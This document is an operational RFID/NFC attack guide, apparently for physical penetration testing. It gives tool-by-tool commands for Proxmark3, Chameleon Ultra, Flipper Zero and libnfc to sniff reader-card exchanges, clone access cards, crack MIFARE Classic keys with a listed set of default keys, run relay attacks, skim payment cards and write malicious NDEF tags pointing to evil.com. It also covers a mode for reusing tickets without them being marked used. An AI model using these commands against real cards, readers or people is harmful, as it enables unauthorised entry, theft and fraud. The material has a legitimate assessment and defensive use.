# RFID/NFC Attack Patterns

Covers low-frequency (125kHz), high-frequency (13.56MHz), and NFC. Structured by attack class, with per-tool commands where they differ. Tool reference at the end.

---

## Frequency Basics

| Frequency | Common protocols | Read range | Notes |
|-----------|-----------------|------------|-------|
| 125kHz (LF) | EM4100, HID Prox, AWID, Indala, FDX-B | ~10cm | Almost always no crypto. Legacy access control. |
| 13.56MHz (HF) | MIFARE Classic, Ultralight, DESFire, iCLASS, NTAG, ISO 15693 | ~10cm | Varies massively. Classic is broken, DESFire EV2/EV3 is not. |
| 13.56MHz (NFC) | NFC-A/B/F/V, ISO 14443, NDEF | ~5cm | Subset of HF. Payment cards, phones, NTAG stickers. |

LF is almost always trivially clonable. Most building access still runs on it.

---

## Attack Classes

### 1. Eavesdropping

Passively capture the exchange between reader and card. No interaction with the card holder required if you can position near the reader.

What you get: full protocol trace including challenge-response. For MIFARE Classic this feeds offline nonce cracking. For DESFire/iCLASS the crypto holds but you learn the protocol structure.

Range: Proxmark3 with a large flat antenna passively captures at 50cm+. A covert antenna fits in a bag.

**Proxmark3**
```
hf sniff        # HF eavesdrop
lf sniff        # LF eavesdrop
hf list 14a     # parse captured trace
```

**Chameleon Ultra**

Chameleon Ultra has a sniffer mode. In the CLI:
```
# Connect via USB or BLE
chameleon-cli

# Enable sniffer slot
hw slot set 1
hw slot config sniffer enable

# Retrieve captured data after a tap
hf 14a sniff get
```

The captured frames can be exported and fed into mfkey32 for offline nonce cracking against MIFARE Classic.

**Flipper Zero**

Flipper does not have a dedicated sniffer mode for HF. For LF it can read and save but not sniff the full exchange. Use Proxmark3 or Chameleon Ultra for eavesdropping.

---

### 2. Cloning / Skimming

Read a card and write a copy to a blank.

**LF cloning** - no auth on EM4100, HID 26-bit, most legacy formats. Read the UID and modulation, write to a T5577 blank. T5577 emulates most LF protocols.

*Proxmark3*
```
lf search              # auto-detect card type
lf em 410x read        # read EM4100
lf em 410x clone --id <id>

lf hid read            # read HID Prox
lf hid clone --r <raw>
```

*Chameleon Ultra*
```
# In chameleon-cli after reading a card
hw slot set 1
hw slot type EM410X
em410x set --id <id>
hw slot active
```

*Flipper Zero*
```
RFID -> Read -> Save
RFID -> Saved -> <card> -> Write to blank
```

**HF cloning - MIFARE Classic**

Requires cracking sector keys first (see section 4). Once you have all keys, dump the card, write to a magic card.

Magic cards (gen1a/gen2/CUID) have a backdoor command that allows writing block 0, which contains the UID and is normally read-only on genuine cards.

*Proxmark3*
```
hf mf dump                        # dump all sectors after cracking
hf mf cload -f <dumpfile>         # write to gen1a magic card
hf mf cload --gen2 -f <dumpfile>  # write to gen2 magic card
```

*Chameleon Ultra*

Chameleon Ultra can load a MIFARE Classic dump directly into a slot and emulate it - no physical magic card needed.
```
# Via chameleon-cli
hw slot set 1
hw slot type MF1S50          # MIFARE Classic 1K
mf1 set --dump <dumpfile>
hw slot active

# Or load via the companion app
# Slot Manager -> Import -> select .mfd file
```

*Flipper Zero*
```
NFC -> Read (gets UID + partial data if no keys known)
NFC -> Saved -> <card> -> Write (to magic card only)
```

Flipper cannot crack MIFARE Classic keys on-device. It can try a built-in default key list. For unknown keys you need Proxmark3 or to pull nonces to crack offline.

**HF cloning - MIFARE Ultralight / NTAG**

No auth on most variants. Read and write directly.

*Proxmark3*
```
hf mfu dump
hf mfu restore -f <dumpfile>
```

*Chameleon Ultra*
```
hw slot type MFU
mfu set --dump <dumpfile>
```

*Flipper Zero*
```
NFC -> Read -> Save
NFC -> Saved -> <card> -> Write
```

**DESFire, iCLASS, SEOS**

Not cloneable without keys. UID-only cloning sometimes works if the reader only checks the UID (see checklist).

---

### 3. Relay Attack

Extend card range without the holder knowing. Two devices: one near the reader (mole), one near the card (ghost). Reader thinks card is present. Distance can reach tens of metres depending on BLE/WiFi backhaul latency.

Defeats range-based security assumptions. Used to: enter buildings (victim nearby, door reader 30m away), authorise NFC payments, unlock cars (PKE relay is mainstream car theft).

NFC payment relay requires sub-150ms round trip or the terminal rejects. BLE latency is typically within this at short range.

**Chameleon Ultra**

This is the strongest use case for Chameleon Ultra. It is purpose-built for relay with BLE coordination between ghost and mole roles.

```
# Device 1 (Ghost) - near victim's card
# Device 2 (Mole) - near reader

# In companion app or CLI:
# Ghost device:
hw slot set 1
relay mode ghost

# Mole device:
relay mode mole
relay pair <ghost_device_id>

# Once paired, Ghost reads the card field, Mole presents to reader
# BLE carries the relay traffic between the two
```

The Chameleon Ultra's relay implementation handles the timing constraints automatically. It supports MIFARE Classic and ISO 14443-A relay.

**Proxmark3**

Relay requires two Proxmark3 units connected to laptops that communicate over a network socket.

```
# On the mole machine (near reader):
hf 14a reader -k     # keep field on

# On the ghost machine (near card):
hf 14a sim -u <uid>

# Full relay via network:
proxmark3 /dev/ttyACM0 --relay
# See Proxmark3 relay documentation for full setup
```

**Flipper Zero**

Flipper Zero does not support relay attacks. It can emulate a static card but cannot bridge a live relay.

---

### 4. MIFARE Classic Cryptanalysis

MIFARE Classic uses Crypto-1, reverse engineered in 2008. It is broken. Multiple attacks exist depending on what you start with.

**Step 0: Try default keys first**

Many deployments never change factory keys. Fast to check, worth doing before any cryptanalysis.

*Proxmark3*
```
hf mf fchk --1k -f mfc_default_keys.dic
hf mf fchk --4k -f mfc_default_keys.dic
```

*Chameleon Ultra*

Chameleon Ultra does not run on-device cryptanalysis. It can capture nonces for offline cracking. Use Proxmark3 for active attacks, or:
```
# Chameleon Ultra sniffer -> export nonces -> mfkey32 offline
```

*Flipper Zero*
```
NFC -> Read -> tries built-in key list (~1000 common keys)
```

Common default keys to try manually:
```
FFFFFFFFFFFF
000000000000
A0A1A2A3A4A5
B0B1B2B3B4B5
AABBCCDDEEFF
4D3A99C351DD
1A982C7E459A
D3F7D3F7D3F7
714C5C886E97
587EE5F9350F
```

**Darkside attack** - no known keys required. Exploits RNG weakness to recover one sector key. ~1 minute of card proximity. Proxmark3 only.

```
hf mf darkside
```

**Nested attack** - once you have one key, recover all others. Seconds. Proxmark3 only.

```
hf mf nested --1k --tblk 0 --ta --ka <known_key>
```

**Hardnested** - for cards with nonce hardening where nested fails.

```
hf mf hardnested -t --tblk 0 --ta --ka <known_key>
```

**staticnested** - for cards with static/predictable nonces.

```
hf mf staticnested --1k --tblk 0 --ta --ka <known_key>
```

**Offline nonce cracking** - eavesdrop reader-card exchange, extract nonces, crack offline. Chameleon Ultra sniffer feeds this workflow.

```
# Proxmark3 - capture and extract
hf sniff
hf list 14a -f
# Feed nonces to mfkey32v2

# Chameleon Ultra - export captured frames
# then run mfkey32 on extracted nonces
```

Full workflow: default keys -> darkside (if no keys found) -> nested (to get all sector keys) -> dump -> load into Chameleon Ultra slot or write to magic card.

---

### 5. Fuzzing / Protocol Abuse

Send malformed or unexpected commands to find reader firmware bugs or undocumented card functions.

**Proxmark3**
```
# Raw APDU
hf 14a raw -s -c <hex>

# SELECT with various AIDs
hf 14a raw -s -c 00A40400<len><aid>

# Script-based fuzzing
script run hf_mf_uidbruteforce
```

**Chameleon Ultra**

Chameleon Ultra can respond to reader commands with custom responses, making it useful for testing how readers handle unexpected card behaviour.

```
# Load a partial/malformed dump and observe reader response
# Useful for testing whether reader accepts truncated sector data
hw slot type MF1S50
mf1 set --uid <uid>
# Leave sectors unprogrammed, watch reader error handling
```

**Flipper Zero**

Flipper has limited fuzzing capability. Can send raw NFC commands via the NFC Dev app (third-party).

---

### 6. NFC-Specific Attacks

**NDEF poisoning**

NFC tags store NDEF records: URLs, plain text, vCards, Android app intents. Devices that auto-act on NDEF (NFC-triggered automations, Android Beam remnants, kiosk modes) will execute what the tag says.

A malicious tag can: open a URL, trigger an Android intent, launch an app via deeplink, initiate a phone call.

*Flipper Zero*
```
NFC -> Add Manually -> NFC-A -> NDEF URL
# Enter payload URL, write to blank NTAG
```

*Proxmark3*
```
hf mfu ndef -u https://evil.com
```

*Chameleon Ultra*

Chameleon Ultra can emulate an NTAG/Ultralight with a custom NDEF payload:
```
hw slot set 1
hw slot type MFU
# Load NDEF payload via companion app or mfu set
```

**Payment card skimming**

NFC payment cards respond to SELECT and READ RECORD without authentication. Readable fields:
- PAN (card number)
- Expiry
- Cardholder name (sometimes)
- Transaction history (some cards)

Not sufficient for CNP on cards with dynamic CVV. Dynamic CVV is standard on Visa/MC now.

*Proxmark3*
```
emv scan -a -n -t -v
```

*Flipper Zero*
```
NFC -> Read -> reads EMV data if card is in field
```

**Wiegand sniffing**

Wiegand is the protocol between the reader and the access controller panel. Unencrypted, unidirectional, no auth. Physical access to the cable between reader and panel (readers are often mounted externally) lets you read or inject card data.

Not RF but relevant during physical assessments. Flipper Zero has a Wiegand sniffer app. Dedicated tools: Bus Pirate, Logic analyser.

---

## Tool Reference

### Chameleon Ultra

Purpose-built for emulation and relay. Compact enough for daily carry. 8 card slots switchable via button or BLE.

**Supported emulation types**
- MIFARE Classic 1K / 4K
- MIFARE Ultralight / NTAG
- EM4100 (LF)
- HID Prox (LF)
- ISO 14443-A generic

**Interfaces**
- USB CDC (serial)
- BLE (companion app on iOS/Android)
- Physical button (slot switching, mode toggle)

**CLI (chameleon-cli or ChameleonUltra repo)**
```
# Connect
chameleon-cli --port /dev/ttyACM0

# Slot management
hw slot set <1-8>                  # select slot
hw slot type MF1S50                # set card type for slot
hw slot type EM410X
hw slot active                     # activate current slot config

# Load MIFARE Classic dump
mf1 set --dump cards/mycard.mfd

# Load EM4100
em410x set --id <10-digit hex>

# Relay mode
relay mode ghost
relay mode mole
relay pair <device_id>

# Sniffer
hw slot config sniffer enable
hf 14a sniff get                   # retrieve after capture
```

**Operating modes**

Each slot on the Chameleon Ultra runs in one of several modes. The mode determines how the device responds to reader interactions.

*Normal (emulation)*

Default mode. Device emulates the stored card data faithfully. Reader sees an identical card. Reads and writes from the reader are applied to the slot data in memory.

Use when: standard cloning, testing access, presenting a card at a reader.

```
hw slot config mode normal
```

*Shadow mode*

Emulates the card but silently discards any writes the reader attempts. From the reader's perspective the write succeeded. The slot data on the device is unchanged.

Use when: the target reader writes to the card on presentation (ticketing systems that mark a ticket as used, loyalty cards that decrement a counter, access cards that log entry). Shadow mode lets you tap the same card repeatedly without it being marked or consumed.

```
hw slot config mode shadow
```

*Reader mode*

Device acts as a card reader rather than a card. Reads whatever card is placed near it.

Use when: reading a card directly from the Chameleon Ultra without a separate reader. Output captured for loading into a slot.

```
hw mode reader
```

*Sniffer mode*

Passive. Device listens to the RF field between a reader and a legitimate card without interfering. Captures the full exchange.

Use when: you cannot read the card directly (it's embedded, in a wallet, in a key fob) but can get near a reader-card interaction. Captured nonces feed offline MIFARE Classic cracking.

```
hw slot config sniffer enable
hf 14a sniff get
```

*Relay mode*

Device acts as either ghost (near victim card) or mole (near reader), bridging the RF exchange over BLE to a second Chameleon Ultra. See relay attack section for full setup.

```
relay mode ghost
relay mode mole
```

**Companion app workflow**

1. Pair via BLE
2. Slot Manager -> select slot -> assign card type
3. Import dump file or enter UID manually
4. Write to slot
5. Set mode per slot (normal, shadow, sniffer)
6. Button short-press cycles slots, long-press toggles active/sleep

**Relay setup (two Chameleon Ultras)**

1. Both devices paired in app
2. Device A: set role Ghost (near victim card)
3. Device B: set role Mole (near reader)
4. Initiate relay from app - devices coordinate over BLE
5. Present Device B to reader, Device A to card

**Sniffer -> offline crack workflow**

1. Enable sniffer on a slot
2. Place Chameleon Ultra near a legitimate reader-card exchange
3. Export captured frames via CLI or app
4. Extract nonces: `mfkey32v2 <nonce data>`
5. Use recovered keys to decrypt sectors
6. Load decrypted dump into emulation slot

---

### Proxmark3

The reference tool for active attacks, cryptanalysis, and protocol research. Not pocket-sized but does everything.

**Key commands**
```
# Auto-detect
auto

# HF
hf search                          # identify HF card
hf 14a info                        # detailed ISO 14443-A info
hf mf fchk --1k -f <dict>         # key check
hf mf darkside                     # recover first key (no keys known)
hf mf nested --1k --tblk 0 --ta --ka <key>   # recover remaining keys
hf mf hardnested -t --tblk 0 --ta --ka <key> # hardened cards
hf mf dump                         # dump all sectors
hf mf cload -f <dumpfile>          # write to gen1a magic card
hf mf sim --1k -u <uid>            # emulate

# LF
lf search                          # identify LF card
lf em 410x read                    # read EM4100
lf em 410x clone --id <id>
lf hid read
lf hid clone --r <raw>

# Sniffer
hf sniff
hf list 14a

# EMV
emv scan -a -n -t -v

# Raw
hf 14a raw -s -c <apdu hex>
```

**Scripts**

Proxmark3 ships with Lua and JavaScript scripts for common tasks:
```
script list
script run hf_mf_autopwn           # full MIFARE Classic auto-attack
script run hf_mf_uidbruteforce
```

`hf mf autopwn` combines default key check, darkside, nested, and dump in one command. Start here for MIFARE Classic.

---

### Flipper Zero

Most portable. Good for quick reads and LF cloning in the field. Limited on HF crypto.

**LF RFID**
```
RFID -> Read -> identifies and saves EM4100, HID, other LF
RFID -> Saved -> Write   # write to T5577 blank
RFID -> Add Manually     # enter known ID manually
```

**NFC (HF)**
```
NFC -> Read              # reads UID, tries known key list for MIFARE Classic
NFC -> Saved -> Emulate  # emulate saved card (UID + data it could read)
NFC -> Saved -> Write    # write to magic card
NFC -> Add Manually -> NFC-A -> NDEF  # write custom NDEF
```

Flipper cannot crack unknown MIFARE Classic keys on-device beyond its built-in ~1000 key list. If a key is not in that list, use Proxmark3 or pull nonces via Chameleon Ultra sniffer.

**NFC Dev app (Momentum/RogueMaster firmware)**

Third-party firmware adds a raw NFC tool for sending arbitrary APDUs. Useful for protocol research without a Proxmark3.

**Limitations**
- No relay
- No active cryptanalysis beyond default key list
- No eavesdropping mode

---

### ACR122U + libnfc / nfcpy

USB NFC reader. Cheapest entry point for scripted HF attacks. No LF support.

```bash
# Detect card
nfc-list

# Read MIFARE Classic (with known key)
nfc-mfclassic r a mycard.mfd

# Write dump to magic card
nfc-mfclassic W a mycard.mfd

# Python with nfcpy
import nfc
with nfc.ContactlessFrontend('usb') as clf:
    clf.connect(rdwr={'on-connect': lambda tag: print(tag)})
```

Useful for scripting automated read/write workflows, especially when processing many cards.

---

## Defensive Weaknesses

**LF has no tamper detection** - cards can be read without the holder's knowledge, no log, no counter.

**MIFARE Classic still deployed everywhere** - broken since 2008, still in most building access systems. Any MIFARE Classic 1K/4K site is vulnerable to the full chain.

**UID-only readers** - system checks UID only, ignores sector data and auth. Trivially bypassed by cloning just the UID to a T5577 (LF) or magic card (HF).

**Wiegand is indefensible** - unencrypted, no auth, on a wire outside the secure perimeter. OSDP replaces it. Most installs don't use OSDP.

**No mutual auth** - the reader doesn't prove identity to the card. Rogue readers can skim any card that comes near.

**Signed references don't mean authorised** - HMAC-signed UIDs prevent tampering but don't prove the presenter owns the card. The reader still can't tell if you're the legitimate holder.

---

## Assessment Checklist

- [ ] Identify frequency: phone NFC scan for HF, Proxmark/Flipper auto-detect for both
- [ ] Identify protocol: MIFARE Classic, Ultralight, DESFire, iCLASS, EM4100, HID
- [ ] LF: clone to T5577, test at reader
- [ ] MIFARE Classic: autopwn -> dump -> load into Chameleon Ultra slot, test at reader
- [ ] MIFARE Classic: if autopwn slow, try default keys first then darkside -> nested
- [ ] DESFire/iCLASS/SEOS: test UID-only by cloning just UID to magic card
- [ ] Check Wiegand: external reader with visible cable is always worth inspecting
- [ ] Emulate card and test - confirm whether reader checks sectors or UID only
- [ ] Check NFC auto-actions on target devices (phones, kiosks)
- [ ] Payment cards in scope: run emv scan, document what's readable
